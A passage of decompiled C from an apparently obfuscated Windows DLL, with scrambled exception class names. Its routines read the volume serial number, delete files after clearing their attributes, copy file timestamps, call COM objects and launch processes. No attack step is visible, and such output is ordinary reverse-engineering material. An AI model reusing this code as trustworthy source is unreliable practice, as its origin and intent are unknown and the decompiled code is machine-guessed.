  sub_10020926(a1);
  *a1 = &off_100942CC;
  sub_100209A7(a1 + 1);
  sub_100209E4(a1 + 5);
  return a1;
}
// 100942CC: using guessed type int (__thiscall *off_100942CC)(void *Block, char);

//----- (10020795) --------------------------------------------------------
int __userpurge sub_10020795@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (10020828) --------------------------------------------------------
void __usercall sub_10020828(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10020862) --------------------------------------------------------
void __usercall sub_10020862(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002088A) --------------------------------------------------------
void __usercall sub_1002088A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100208C4) --------------------------------------------------------
void __usercall sub_100208C4(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100208FE) --------------------------------------------------------
void __usercall sub_100208FE(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10020926) --------------------------------------------------------
_DWORD *__stdcall sub_10020926(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100941E0;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100941E0: using guessed type int (__thiscall *off_100941E0)(void *Block, char);

//----- (10020951) --------------------------------------------------------
_DWORD *__stdcall sub_10020951(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10094364;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094364: using guessed type int (__thiscall *off_10094364)(void *Block, char);

//----- (1002097C) --------------------------------------------------------
_DWORD *__stdcall sub_1002097C(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100943BC;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100943BC: using guessed type int (__thiscall *off_100943BC)(void *Block, char);

//----- (100209A7) --------------------------------------------------------
_DWORD *__stdcall sub_100209A7(_DWORD *a1)
{
  int v1; // eax

  sub_10020951(a1);
  *a1 = &off_10094270;
  v1 = sub_1001FB97(1u, 0x10u);
  sub_10020A49(v1, a1);
  return a1;
}
// 10094270: using guessed type int (__thiscall *off_10094270)(void *Block, char);

//----- (100209E4) --------------------------------------------------------
_DWORD *__stdcall sub_100209E4(_DWORD *a1)
{
  unsigned int v1; // eax

  sub_1002097C(a1);
  *a1 = &off_10094308;
  v1 = sub_1001FF82(1u, 0x10u);
  sub_10020A69(v1, a1);
  return a1;
}
// 10094308: using guessed type int (__thiscall *off_10094308)(void *Block, char);

//----- (10020A49) --------------------------------------------------------
void *__usercall sub_10020A49@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020A69) --------------------------------------------------------
void *__usercall sub_10020A69@<eax>(size_t a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(a1);
  a2[3] = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10020A8C) --------------------------------------------------------
LONG __cdecl sub_10020A8C(int a1, int a2)
{
  int *v2; // ecx
  int *v3; // esi
  _DWORD *v4; // eax
  int v5; // edi
  const WCHAR *v6; // edi
  WCHAR *v7; // eax
  int pExceptionObject; // [esp+10h] [ebp-28h] BYREF
  int v10[2]; // [esp+14h] [ebp-24h] BYREF
  int v11; // [esp+1Ch] [ebp-1Ch] BYREF
  int v12; // [esp+20h] [ebp-18h] BYREF
  DWORD VolumeSerialNumber; // [esp+24h] [ebp-14h] BYREF
  char v14; // [esp+2Bh] [ebp-Dh]
  int v15; // [esp+34h] [ebp-4h]

  v3 = v2;
  v4 = sub_1000CC90(50, v10);
  v15 = 0;
  sub_10002C25(v4 + 1, v3 + 1);
  v15 = -1;
  sub_1000CE59(v10);
  v5 = v3[1];
  VolumeSerialNumber = 0;
  v14 = *(_BYTE *)(v5 + 8);
  v6 = *(const WCHAR **)(*(_DWORD *)(a1 + 4) + 12);
  v7 = (WCHAR *)sub_1000D0D9(v3);
  if ( !GetVolumeInformationW(v6, v7, 0x32u, &VolumeSerialNumber, 0, 0, 0, 0) )
  {
    sub_100167F9(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( v14 )
    sub_1000D118((int)v3);
  sub_10012A00(&v11, word_100B7608);
  v15 = 1;
  sub_1000D184((int)&v11, asc_100B760C, VolumeSerialNumber);
  sub_10002C25(&v12, (int *)(a2 + 4));
  v15 = -1;
  return sub_10012AAC(&v11);
}
// 10020A98: variable 'v2' is possibly undefined
// 100B7608: using guessed type wchar_t word_100B7608[2];
// 100B760C: using guessed type wchar_t asc_100B760C[3];

//----- (10020B59) --------------------------------------------------------
int *__cdecl sub_10020B59(int *a1, int a2)
{
  const WCHAR *v2; // ebx
  WCHAR *v3; // eax
  unsigned int LongPathNameW; // edi
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  sub_1000CC90(260, a1);
  v8 = 0;
  v2 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v7 = 1;
  v3 = (WCHAR *)sub_1000D0D9(a1);
  LongPathNameW = GetLongPathNameW(v2, v3, 0x104u);
  if ( !LongPathNameW || LongPathNameW != sub_1000D0EE((int)a1) )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  sub_1000D118((int)a1);
  sub_1000D7ED(LongPathNameW, a1);
  return a1;
}
// 10020B59: using guessed type _DWORD pExceptionObject[4];

//----- (10020BDD) --------------------------------------------------------
int *__cdecl sub_10020BDD(int *a1, int a2)
{
  const WCHAR *v2; // ebx
  WCHAR *v3; // eax
  unsigned int ShortPathNameW; // edi
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  sub_1000CC90(260, a1);
  v8 = 0;
  v2 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v7 = 1;
  v3 = (WCHAR *)sub_1000D0D9(a1);
  ShortPathNameW = GetShortPathNameW(v2, v3, 0x104u);
  if ( !ShortPathNameW || ShortPathNameW != sub_1000D0EE((int)a1) )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  sub_1000D118((int)a1);
  sub_1000D7ED(ShortPathNameW, a1);
  return a1;
}
// 10020BDD: using guessed type _DWORD pExceptionObject[4];

//----- (10020C61) --------------------------------------------------------
int *__cdecl sub_10020C61(int *a1, int a2)
{
  const WCHAR *v2; // ebx
  WCHAR *v3; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-28h] BYREF
  LPWSTR FilePart; // [esp+20h] [ebp-18h] BYREF
  int v7; // [esp+24h] [ebp-14h]
  int v8; // [esp+34h] [ebp-4h]

  v7 = 0;
  sub_1000CC90(260, a1);
  v8 = 0;
  v2 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v7 = 1;
  v3 = (WCHAR *)sub_1000D0D9(a1);
  if ( !GetFullPathNameW(v2, 0x104u, v3, &FilePart) )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  sub_1000D118((int)a1);
  return a1;
}
// 10020C61: using guessed type _DWORD pExceptionObject[4];

//----- (10020CD2) --------------------------------------------------------
bool __usercall sub_10020CD2@<al>(int a1@<eax>)
{
  return GetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12)) != -1;
}

//----- (10020CE9) --------------------------------------------------------
bool __cdecl sub_10020CE9(int a1)
{
  bool v1; // bl
  DWORD FileAttributesW; // eax
  int v4; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  sub_10012A7C(&v4, a1);
  v1 = 0;
  v6 = 0;
  if ( *(_WORD *)sub_1000CF9F(&v4, *(_DWORD *)(v5 + 28) - 1) == 92 )
    sub_1000D7ED(*(_DWORD *)(v5 + 28) - 1, &v4);
  FileAttributesW = GetFileAttributesW(*(LPCWSTR *)(v5 + 12));
  if ( FileAttributesW != -1 )
    v1 = (FileAttributesW & 0x10) != 0;
  v6 = -1;
  sub_10012AAC(&v4);
  return v1;
}

//----- (10020DAC) --------------------------------------------------------
LONG __cdecl sub_10020DAC(int a1, int a2)
{
  DWORD v2; // esi
  volatile LONG *v3; // ecx
  volatile LONG *v5; // [esp+0h] [ebp-B8h] BYREF
  volatile LONG *v6; // [esp+4h] [ebp-B4h]
  HANDLE v7[20]; // [esp+18h] [ebp-A0h] BYREF
  HANDLE v8[10]; // [esp+68h] [ebp-50h] BYREF
  FILETIME v9; // [esp+90h] [ebp-28h] BYREF
  FILETIME v10; // [esp+98h] [ebp-20h] BYREF
  FILETIME v11; // [esp+A0h] [ebp-18h] BYREF
  int *v12; // [esp+A8h] [ebp-10h]
  int v13; // [esp+B4h] [ebp-4h]

  v12 = (int *)&v5;
  sub_10014512(&v5);
  v13 = -1;
  sub_100106B7(0, (int)v7, a1, (int)v5, v6);
  v13 = 1;
  v2 = sub_1001217E(v7);
  sub_10011FC5(v7, &v9, 1);
  sub_10012058(v7, &v11, 1);
  sub_100120EB(v7, &v10, 1);
  v6 = v3;
  v5 = v3;
  v12 = (int *)&v5;
  sub_10014512(&v5);
  LOBYTE(v13) = 1;
  sub_10011AFB(-1, 0x40000000, v8, a2, 128, 4, (int)v5, v6);
  LOBYTE(v13) = 3;
  sub_1001224D(v8, 0);
  sub_10012006(v8, &v9, 1);
  sub_1001209B(v8, &v11, 1);
  sub_1001212C(v8, &v10, 1);
  sub_1001224D(v8, v2);
  LOBYTE(v13) = 1;
  sub_10011C44((int)v8);
  v13 = -1;
  return sub_10010768(v7);
}
// 10020E25: variable 'v3' is possibly undefined
// 10020DAC: using guessed type HANDLE var_A0[20];
// 10020DAC: using guessed type HANDLE var_50[10];

//----- (10020EB6) --------------------------------------------------------
int __cdecl sub_10020EB6(int a1, unsigned int a2, void *a3)
{
  DWORD v3; // ecx
  DWORD v4; // ebx
  DWORD v5; // eax
  DWORD v6; // esi
  __int32 v7; // eax
  int v8; // ebx
  _DWORD *v9; // eax
  int v11; // [esp+0h] [ebp-B0h] BYREF
  _ThrowInfo *v12; // [esp+4h] [ebp-ACh]
  HANDLE v13[20]; // [esp+18h] [ebp-98h] BYREF
  int v14[5]; // [esp+68h] [ebp-48h] BYREF
  int v15[6]; // [esp+7Ch] [ebp-34h] BYREF
  int pExceptionObject; // [esp+94h] [ebp-1Ch] BYREF
  char v17[8]; // [esp+98h] [ebp-18h] BYREF
  int v18; // [esp+A0h] [ebp-10h]
  int v19; // [esp+ACh] [ebp-4h]
  DWORD v20; // [esp+BCh] [ebp+Ch]

  v4 = v3;
  v15[5] = (int)&v11;
  sub_10014512(&v11);
  v19 = -1;
  sub_100106B7(0x80000000, (int)v13, a1, v11, (volatile LONG *)v12);
  v19 = 1;
  sub_100107AA(v13);
  v5 = sub_100122A1(v13);
  if ( a2 > v5 )
  {
    sub_10027E9A(&pExceptionObject);
    v12 = (_ThrowInfo *)&_TI5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__;
    goto LABEL_3;
  }
  v6 = v5 - a2;
  v7 = sub_10012712(v13, a2, 0);
  if ( v4 == -1 || (v20 = v4, v4 >= v6) )
    v20 = v6;
  sub_10015CC3(v7, (int)v17);
  while ( v20 )
  {
    sub_10016983(a3, (int)v15, 0);
    LOBYTE(v19) = 2;
    v8 = sub_10012521(v13, v15);
    if ( v8 == -1 )
    {
      sub_10027B8C(&pExceptionObject, 1);
      v12 = (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__;
LABEL_3:
      _CxxThrowException(&pExceptionObject, v12);
    }
    v9 = (_DWORD *)sub_10016DFF(v8, v15, (int)v14, 0);
    LOBYTE(v19) = 3;
    sub_10015CDE(v9, (int)v17);
    LOBYTE(v19) = 2;
    sub_10016B53(v14);
    v20 -= v8;
    LOBYTE(v19) = 1;
    sub_10016B53(v15);
  }
  sub_10010B8D(v13);
  v19 = -1;
  sub_10010768(v13);
  return v18;
}
// 10020EC5: variable 'v3' is possibly undefined
// 10020EB6: using guessed type HANDLE var_98[20];
// 10020EB6: using guessed type int var_48[5];

//----- (10020FF4) --------------------------------------------------------
int *__cdecl sub_10020FF4(int *a1, int a2, _ThrowInfo *a3)
{
  int *p_pExceptionObject; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // edi
  int v9; // eax
  int v10; // eax
  _ThrowInfo *v12; // [esp-8h] [ebp-98h] BYREF
  _ThrowInfo *v13; // [esp-4h] [ebp-94h]
  HANDLE v14[10]; // [esp+10h] [ebp-80h] BYREF
  _DWORD v15[2]; // [esp+38h] [ebp-58h] BYREF
  _DWORD v16[2]; // [esp+40h] [ebp-50h] BYREF
  _DWORD v17[2]; // [esp+48h] [ebp-48h] BYREF
  _DWORD v18[2]; // [esp+50h] [ebp-40h] BYREF
  FILETIME v19; // [esp+58h] [ebp-38h] BYREF
  __int64 v20; // [esp+60h] [ebp-30h] BYREF
  int (__thiscall **v21)(void *, char); // [esp+68h] [ebp-28h] BYREF
  int v22; // [esp+6Ch] [ebp-24h] BYREF
  int v23; // [esp+70h] [ebp-20h]
  int pExceptionObject; // [esp+74h] [ebp-1Ch] BYREF
  int v25; // [esp+78h] [ebp-18h] BYREF
  LPVOID ppv; // [esp+7Ch] [ebp-14h] BYREF
  int v27; // [esp+8Ch] [ebp-4h]

  v27 = 0;
  v23 = 0;
  if ( !sub_100214A5(a2) )
  {
    sub_10016441(&pExceptionObject);
    v13 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  v19.dwLowDateTime = 0;
  v19.dwHighDateTime = 0;
  v12 = v13;
  HIDWORD(v20) = &v12;
  sub_10014512(&v12);
  v27 = 0;
  sub_10011AFB(-1, -2147483392, v14, a2, 128, -1, (int)v12, (volatile LONG *)v13);
  v27 = 2;
  v19 = (FILETIME)*sub_100120EB(v14, &v20, 1);
  sub_1000CC90(260, a1);
  v23 = 1;
  ppv = 0;
  v25 = 0;
  v21 = &off_10094EC8;
  v4 = CoInitializeEx(0, 0);
  if ( v4 < 0 )
    sub_10032C53(v4);
  LOBYTE(v27) = 4;
  v5 = CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv);
  if ( v5 < 0 )
  {
    sub_10016788(v18, v5);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v18;
    goto LABEL_3;
  }
  v6 = (**(int (__stdcall ***)(LPVOID, void *, int *))ppv)(ppv, &unk_1008C770, &v25);
  if ( v6 < 0 )
  {
    sub_10016788(v17, v6);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v17;
    goto LABEL_3;
  }
  if ( !v25 )
  {
    sub_10016441(&v22);
    v13 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v22;
    goto LABEL_3;
  }
  v7 = (*(int (__stdcall **)(int, _DWORD, _DWORD))(*(_DWORD *)v25 + 20))(v25, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12), 0);
  if ( v7 < 0 )
  {
    sub_10016788(v16, v7);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v16;
    goto LABEL_3;
  }
  v8 = *(_DWORD *)ppv;
  v13 = 0;
  v12 = a3;
  v9 = sub_1000D0D9(a1);
  v10 = (*(int (__stdcall **)(LPVOID, int, int, _ThrowInfo *, _ThrowInfo *))(v8 + 12))(ppv, v9, 260, v12, v13);
  if ( v10 < 0 )
  {
    sub_10016788(v15, v10);
    v13 = (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__;
    p_pExceptionObject = v15;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v13);
  }
  sub_1000D118((int)a1);
  v27 = 3;
  if ( v25 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v25 + 8))(v25);
  if ( ppv )
    (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
  LOBYTE(v27) = 2;
  sub_10032C92(&v21);
  LOBYTE(v27) = 8;
  sub_1001212C(v14, &v19, 1);
  v27 = 0;
  sub_10011C44((int)v14);
  return a1;
}
// 10094EC8: using guessed type int (__thiscall *off_10094EC8)(void *Block, char);
// 10020FF4: using guessed type HANDLE var_80[10];
// 10020FF4: using guessed type _DWORD var_40[2];
// 10020FF4: using guessed type _DWORD var_48[2];
// 10020FF4: using guessed type _DWORD var_50[2];
// 10020FF4: using guessed type _DWORD var_58[2];

//----- (10021257) --------------------------------------------------------
_DWORD *__thiscall sub_10021257(_DWORD *this, int a2)
{
  sub_10016406(this, a2);
  *this = &off_10093D24;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10093D24: using guessed type int (__thiscall *off_10093D24)(void *Block, char);

//----- (100212ED) --------------------------------------------------------
DWORD __usercall sub_100212ED@<eax>(int a1@<esi>)
{
  DWORD FileAttributesW; // ebx
  DWORD result; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-10h] BYREF

  FileAttributesW = GetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12));
  SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12), 0x80u);
  result = DeleteFileW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12));
  if ( !result )
  {
    result = GetLastError();
    if ( result != 2 && result != 3 )
    {
      SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12), FileAttributesW);
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return result;
}
// 100212ED: using guessed type _DWORD pExceptionObject[4];

//----- (1002135C) --------------------------------------------------------
int sub_1002135C()
{
  wchar_t *v0; // eax
  volatile LONG *v1; // ecx
  _DWORD *v2; // eax
  int v3; // esi
  volatile LONG *v5; // [esp-8h] [ebp-64h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-60h]
  _DWORD v7[10]; // [esp+10h] [ebp-4Ch] BYREF
  char v8[8]; // [esp+38h] [ebp-24h] BYREF
  int v9[6]; // [esp+40h] [ebp-1Ch] BYREF
  int v10; // [esp+58h] [ebp-4h]

  v10 = 0;
  v0 = (wchar_t *)sub_1000E943((int)&unk_100B7618);
  sub_10012A00(v9, v0);
  LOBYTE(v10) = 1;
  sub_10012BA7((int)v9);
  v6 = v1;
  v5 = v1;
  v9[2] = (int)&v5;
  sub_10014512(&v5);
  LOBYTE(v10) = 1;
  v2 = sub_10011AFB(-1, 0x80000000, v7, (int)v9, 128, -1, (int)v5, v6);
  LOBYTE(v10) = 3;
  v3 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, int))(*v2 + 80))(v2, v8, 1);
  LOBYTE(v10) = 1;
  sub_10011C44((int)v7);
  LOBYTE(v10) = 0;
  sub_10012AAC(v9);
  return v3;
}
// 1002138D: variable 'v1' is possibly undefined
// 1002135C: using guessed type _DWORD var_4C[10];
// 1002135C: using guessed type char var_24[8];

//----- (1002140D) --------------------------------------------------------
LONG __cdecl sub_1002140D(int a1)
{
  DWORD v1; // edx
  volatile LONG *v3; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v4; // [esp-4h] [ebp-64h]
  HANDLE v5[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[4]; // [esp+38h] [ebp-28h] BYREF
  FILETIME v7; // [esp+48h] [ebp-18h] BYREF
  volatile LONG **v8; // [esp+50h] [ebp-10h]
  int v9; // [esp+5Ch] [ebp-4h]

  v7.dwLowDateTime = sub_1002135C();
  v7.dwHighDateTime = v1;
  if ( !sub_10020CE9(a1) )
  {
    sub_10027C51(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
  }
  v3 = v4;
  v8 = &v3;
  sub_10014512(&v3);
  v9 = -1;
  sub_10011AFB(-1, 256, v5, a1, 0x2000000, -1, (int)v3, v4);
  v9 = 1;
  sub_10011F63(v5, &v7, &v7, &v7);
  v9 = -1;
  return sub_10011C44((int)v5);
}
// 10021424: variable 'v1' is possibly undefined
// 1002140D: using guessed type _DWORD pExceptionObject[4];
// 1002140D: using guessed type HANDLE var_50[10];

//----- (100214A5) --------------------------------------------------------
DWORD __cdecl sub_100214A5(int a1)
{
  DWORD v1; // esi
  int v3[7]; // [esp+0h] [ebp-54h] BYREF
  HANDLE v4[11]; // [esp+1Ch] [ebp-38h] BYREF
  int v5; // [esp+50h] [ebp-4h]

  v3[6] = (int)v3;
  sub_10014512(v3);
  v5 = -1;
  sub_10011AFB(-1, 0, v4, a1, 128, -1, v3[0], (volatile LONG *)v3[1]);
  v5 = 1;
  v1 = sub_100122A1(v4);
  v5 = -1;
  sub_10011C44((int)v4);
  return v1;
}
// 100214A5: using guessed type HANDLE var_38[11];

//----- (10021589) --------------------------------------------------------
void __thiscall sub_10021589(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002803D(this + 3);
  sub_1001646C(v1);
}

//----- (1002159C) --------------------------------------------------------
_DWORD *__thiscall sub_1002159C(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_100946D4;
    this[2] = &unk_100946DC;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_10010A0E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100946CC;
  return this;
}
// 100946CC: using guessed type int (__stdcall *off_100946CC)(char);

//----- (10021612) --------------------------------------------------------
char *__thiscall sub_10021612(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10021589(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (100216B4) --------------------------------------------------------
void __thiscall sub_100216B4(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_100280C0(this + 3);
  sub_1001646C(v1);
}

//----- (100216C7) --------------------------------------------------------
_DWORD *__thiscall sub_100216C7(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_100946EC;
    this[2] = &unk_100946F4;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_1002159C(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100946E4;
  return this;
}
// 100946E4: using guessed type int (__stdcall *off_100946E4)(char);

//----- (1002173D) --------------------------------------------------------
char *__thiscall sub_1002173D(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_100216B4(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1002176C) --------------------------------------------------------
_DWORD *__usercall sub_1002176C@<eax>(int a1@<edi>, _DWORD *a2, int a3)
{
  int v4[5]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  sub_1000CC20(a2, asc_100B7614);
  v5 = 0;
  v4[2] = 1;
  sub_1000CFB9((int)a2, a3);
  sub_1000CC20(v4, asc_100B7670);
  v5 = 1;
  sub_1000CFB9((int)a2, (int)v4);
  LOBYTE(v5) = 0;
  sub_1000CE59(v4);
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    sub_1000CC20(v4, asc_100B7674);
    v5 = 2;
    sub_1000CFB9((int)a2, (int)v4);
    LOBYTE(v5) = 0;
    sub_1000CE59(v4);
    sub_1000CFB9((int)a2, a1);
  }
  return a2;
}
// 100B7614: using guessed type wchar_t asc_100B7614[2];
// 100B7670: using guessed type wchar_t asc_100B7670[2];
// 100B7674: using guessed type wchar_t asc_100B7674[2];

//----- (10021804) --------------------------------------------------------
void *__usercall sub_10021804@<eax>(int a1@<ecx>, _DWORD *a2@<esi>)
{
  void *result; // eax
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = a1;
  if ( !a2 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  result = memset(a2, 0, 0x44u);
  *((_WORD *)a2 + 24) = 0;
  *a2 = 68;
  a2[11] = 1;
  return result;
}

//----- (10021843) --------------------------------------------------------
HANDLE __usercall sub_10021843@<eax>(int a1@<ecx>, int a2@<ebx>)
{
  HANDLE hProcess; // esi
  int v4; // [esp-4h] [ebp-8Ch]
  struct _STARTUPINFOW StartupInfo; // [esp+10h] [ebp-78h] BYREF
  _DWORD pExceptionObject[4]; // [esp+54h] [ebp-34h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+64h] [ebp-24h] BYREF
  int v8[4]; // [esp+74h] [ebp-14h] BYREF
  int v9; // [esp+84h] [ebp-4h]

  sub_1002176C(a1, v8, a2);
  v9 = 0;
  sub_10021804(v4, &StartupInfo);
  sub_1000CF22(v8);
  if ( !CreateProcessW(
          *(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12),
          *(LPWSTR *)(v8[1] + 12),
          0,
          0,
          0,
          0,
          0,
          0,
          &StartupInfo,
          &ProcessInformation) )
  {
    if ( GetLastError() == 2 )
    {
      sub_10027C51(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    sub_10027FE0(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVHzsnwtmRbderjskb_jhzi_sr__);
  }
  CloseHandle(ProcessInformation.hThread);
  hProcess = ProcessInformation.hProcess;
  v9 = -1;
  sub_1000CE59(v8);
  return hProcess;
}
// 10021865: variable 'v4' is possibly undefined
// 100973A0: using guessed type __TI_flags _TI5_AVHzsnwtmRbderjskb_jhzi_sr__;
// 10021843: using guessed type _DWORD pExceptionObject[4];

//----- (100218E9) --------------------------------------------------------
HANDLE __usercall sub_100218E9@<eax>(int a1@<ecx>, int a2@<ebx>, int a3)
{
  void *v3; // eax
  HANDLE hProcess; // esi
  const WCHAR *v6; // [esp-28h] [ebp-B0h]
  WCHAR *v7; // [esp-24h] [ebp-ACh]
  int v8; // [esp-4h] [ebp-8Ch]
